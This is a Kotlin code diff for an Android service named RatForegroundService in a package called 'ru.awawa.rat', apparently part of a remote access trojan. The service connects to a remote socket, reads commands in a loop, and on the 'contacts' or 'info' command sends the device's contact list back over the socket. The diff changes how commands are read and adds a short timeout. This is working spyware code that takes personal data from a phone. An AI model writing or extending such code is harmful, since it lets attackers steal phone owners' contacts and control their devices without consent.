@@ -7,8 +7,13 @@ import android.util.Log
 import androidx.core.app.JobIntentService
 import ru.awawa.rat.helper.ContactsHelper
 import ru.awawa.rat.helper.toHexString
+import java.io.BufferedInputStream
+import java.io.BufferedReader
+import java.io.InputStreamReader
 import java.net.InetSocketAddress
 import java.net.Socket
+import java.net.SocketException
+import java.net.SocketTimeoutException
 import kotlin.random.Random
 
 
@@ -34,23 +39,25 @@ class RatForegroundService: IntentService("RatForegroundService") {
 
         Log.e(TAG, "Trying to connect")
         socket.connect(connectionAddress)
+        socket.soTimeout = 1
         Log.e(TAG, "Connected")
         running = true
         while (running) {
-            val packet = socket.getInputStream().readBytes()
-            if (packet.isNotEmpty()) {
-                val command = packet.decodeToString()
-                if (command.startsWith("contacts")) {
-                    socket.getOutputStream().write(ContactsHelper.getContacts(this).toByteArray())
-                    return
+            try {
+                val command = BufferedReader(InputStreamReader(socket.getInputStream())).readLine()
+                if (command.isNotEmpty()) {
+                    if (command.startsWith("contacts")) {
+                        socket.getOutputStream().write(ContactsHelper.getContacts(this).toByteArray())
+                        return
+                    }
+                    if (command.startsWith("info")) {
+                        socket.getOutputStream().write(ContactsHelper.getContacts(this).toByteArray())
+                        return
+                    }
+                    Log.e(TAG, command)
                 }
-                if (command.startsWith("info")) {
-                    socket.getOutputStream().write(ContactsHelper.getContacts(this).toByteArray())
-                    return
-                }
-                Log.e(TAG, "${packet.decodeToString()}")
-            }
-            Log.e(TAG, "Read ${packet.toHexString()}")
+                Log.e(TAG, "Read $command")
+            } catch (ex: SocketTimeoutException) {}
         }
         stopForeground(true)
     }
